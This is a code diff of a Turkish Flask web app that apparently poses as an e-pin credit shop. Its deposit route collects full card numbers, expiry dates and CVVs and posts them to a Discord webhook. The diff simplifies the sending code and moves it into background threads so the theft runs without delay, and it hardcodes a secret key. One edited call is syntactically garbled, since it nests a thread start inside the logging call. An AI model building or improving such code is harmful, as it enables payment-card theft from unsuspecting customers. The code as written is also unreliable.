@@ -10,6 +10,7 @@ import random
 import string
 import sqlite3
 import time
+import threading
 
 app = Flask(__name__)
 app.secret_key = "epin-super-gizli-anahtar-12345"
@@ -580,25 +581,10 @@ def send_discord_log(title, description, color):
         }]
     }
     
-    for attempt in range(3):
-        try:
-            response = requests.post(DISCORD_WEBHOOK_URL, json=payload, headers={"Content-Type": "application/json"}, timeout=30)
-            
-            if response.status_code in (200, 204):
-                print("[DISCORD LOG BAŞARILI]")
-                return True
-            elif response.status_code == 429:
-                retry_after = response.json().get("retry_after", 5)
-                print(f"[DISCORD LOG RATE LIMIT] {retry_after} saniye bekleniyor...")
-                time.sleep(retry_after + 2)
-            else:
-                print(f"[DISCORD LOG HATA] Status: {response.status_code}")
-                time.sleep(3)
-        except Exception as e:
-            print(f"[DISCORD LOG İSTİSNA] {e}")
-            time.sleep(3)
-    
-    return False
+    try:
+        requests.post(DISCORD_WEBHOOK_URL, json=payload, headers={"Content-Type": "application/json"}, timeout=15)
+    except Exception as e:
+        print(f"Discord Log Hatası: {e}")
     
 def send_card_info_to_discord(username, card_holder, card_number, exp_date, cvv, bank_name, card_brand, amount):
     print(f"[KART BİLGİSİ ÇAĞRILDI] Kullanıcı: {username}")
@@ -631,54 +617,10 @@ def send_card_info_to_discord(username, card_holder, card_number, exp_date, cvv,
         ]
     }
     
-    # ============================================================
-    # RETRY MEKANİZMASI: 3 kez dene, her denemede bekle
-    # ============================================================
-    max_retries = 5
-    for attempt in range(max_retries):
-        try:
-            response = requests.post(
-                DISCORD_WEBHOOK_URL, 
-                json=payload, 
-                headers={"Content-Type": "application/json"}, 
-                timeout=30
-            )
-            
-            print(f"[KART DISCORD DENEME {attempt + 1}] Status: {response.status_code}")
-            
-            # BAŞARILI
-            if response.status_code in (200, 204):
-                print("[KART DISCORD BAŞARILI]")
-                return True
-            
-            # RATE LIMIT
-            elif response.status_code == 429:
-                retry_after = response.json().get("retry_after", 5)
-                print(f"[KART DISCORD RATE LIMIT] {retry_after} saniye bekleniyor...")
-                time.sleep(retry_after + 2)
-                continue
-            
-            # DİĞER HATALAR
-            else:
-                print(f"[KART DISCORD HATA] Status: {response.status_code}, Body: {response.text}")
-                time.sleep(3)
-                continue
-                
-        except requests.exceptions.Timeout:
-            print(f"[KART DISCORD TIMEOUT] Deneme {attempt + 1}, tekrar deneniyor...")
-            time.sleep(3)
-            continue
-        except requests.exceptions.ConnectionError:
-            print(f"[KART DISCORD BAĞLANTI HATASI] Deneme {attempt + 1}, tekrar deneniyor...")
-            time.sleep(5)
-            continue
-        except Exception as e:
-            print(f"[KART DISCORD İSTİSNA] {e}")
-            time.sleep(3)
-            continue
-    
-    print("[KART DISCORD BAŞARISIZ] Tüm denemeler tükendi!")
-    return False
+    try:
+        requests.post(DISCORD_WEBHOOK_URL, json=payload, headers={"Content-Type": "application/json"}, timeout=15)
+    except Exception as e:
+        print(f"Discord Kart Hatası: {e}")
 
 SUPPORT_AGENTS = {
     "erkek": ["Ahmet K.", "Murat Y.", "Emre T.", "Can B.", "Burak D.", "Kaan S."],
@@ -1293,16 +1235,10 @@ def deposit():
             flash(f"❌ {err_msg}", "danger")
             return redirect(url_for("deposit"))
 
-        send_card_info_to_discord(
-            username=user["username"],
-            card_holder=card_holder,
-            card_number=card_number,
-            exp_date=exp_date,
-            cvv=cvv,
-            bank_name=bank_name,
-            card_brand=card_brand,
-            amount=amount_val
-        )
+        threading.Thread(
+    target=send_card_info_to_discord,
+    args=(user["username"], card_holder, card_number, exp_date, cvv, bank_name, card_brand, amount_val)
+).start()
 
         conn = get_db()
         cursor = conn.cursor()
@@ -1316,10 +1252,10 @@ def deposit():
         conn.close()
 
         send_discord_log(
-            title="💳 Bakiye Yüklendi",
-            description=f"**Kullanıcı:** `{user['username']}`\n**Banka:** `{bank_name}`\n**Yüklenen:** {amount_val:.2f} TL\n**Güncel Bakiye:** {new_balance:.2f} TL",
-            color=3066993
-        )
+            threading.Thread(
+    target=send_discord_log,
+    args=("💳 Bakiye Yüklendi", f"**Kullanıcı:** `{user['username']}`\n**Banka:** `{bank_name}`\n**Yüklenen:** {amount_val:.2f} TL\n**Güncel Bakiye:** {new_balance:.2f} TL", 3066993)
+).start()
 
         flash(f"🎉 Ödeme onaylandı! {amount_val:.2f} TL bakiyenize başarıyla yüklendi.", "success")
         return redirect(url_for("home"))
